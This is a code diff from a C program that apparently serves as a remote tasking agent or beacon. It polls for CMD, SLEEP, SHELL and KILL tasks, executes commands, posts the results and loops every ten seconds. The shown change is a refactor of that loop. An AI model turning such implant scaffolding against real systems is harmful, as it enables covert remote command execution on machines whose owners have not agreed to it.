@@ -82,51 +82,27 @@ int main(void)
             // task execution functions.
             switch (task.type) {
             case CMD:
-                // error = zerg_msg_parse(file, zhdr);
                 puts("CMD task detected\n");
-                // Check to see if binary exists on target host.
-                if(can_run_cmd(task.cmd)) {
-                    puts("Command exists\n");
-                    if(run_cmd(&task)) {
-                        // Eventually will need to include logic if results can't be posted,
-                        // to retain data continuously attempt to re-post until successful.
-                        post_results(&task);
-                    } else {
-                        printf("Unable to execute command %s\n", task.cmd);
-                        // Will need to include logic to post unsuccessful results.
-                        // Memset task values.
-                        reset_task_vals(&task);
-                        continue;
-                    }
-
-                } else {
-                    puts("Command does not exist\n");
-                    // Will need to include logic to post unsuccessful results.
-                    // Memset task values.
-                    reset_task_vals(&task);
-                    continue;
-                }
+                exec_cmd(&task);
                 break;
             case SLEEP:
-                // error = zerg_status_parse(file, zhdr);
                 puts("SLEEP task detected\n");
                 break;
             case SHELL:
-                // error = zerg_command_parse(file, zhdr);
                 puts("SHELL task detected\n");
                 break;
             case KILL:
-                // error = zerg_gps_parse(file, zhdr);
                 puts("KILL task detected\n");
                 break;
             default:
-                // usage();
                 puts("Invalid task type.\n");
                 continue;
             }
 
-            // After executing each task, memset all values to execute
-            // next task.
+            post_results(&task);
+
+            // After executing each task and posting results reset values
+            // to execute  next task.
             reset_task_vals(&task);
 
 
@@ -139,8 +115,6 @@ int main(void)
         sa.response = NULL;
         sa.size = 0;
         task.sz = 0;
-
-
 
         sleep(10);
     }
